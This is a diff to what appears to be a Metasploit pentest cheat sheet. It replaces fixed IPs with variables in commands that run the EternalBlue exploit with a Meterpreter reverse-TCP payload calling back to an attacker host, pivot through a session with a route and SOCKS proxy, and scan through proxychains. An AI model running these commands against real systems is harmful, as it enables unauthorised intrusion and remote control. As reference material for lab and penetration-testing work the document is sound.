@@ -34,9 +34,9 @@ search cve:2021-44228
 ```bash
 use exploit/windows/smb/ms17_010_eternalblue
 show options
-set RHOSTS 10.10.10.10
+set RHOSTS $IP
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST <attacker-ip>
+set LHOST $LHOST
 exploit
 ```
 
@@ -81,7 +81,7 @@ Add an internal route through a session, then start a SOCKS proxy so any tool ca
 
 ```bash
 # 1. Add route via meterpreter session
-route add 10.10.20.0/24 1
+route add $SUBNET 1
 route print
 
 # 2. Start SOCKS5 proxy (modern replacement for socks4a)
@@ -98,7 +98,7 @@ socks5 127.0.0.1 1080
 ```
 
 ```bash
-proxychains nmap -sT -Pn 10.10.10.10
+proxychains nmap -sT -Pn $IP
 ```
 
 ---
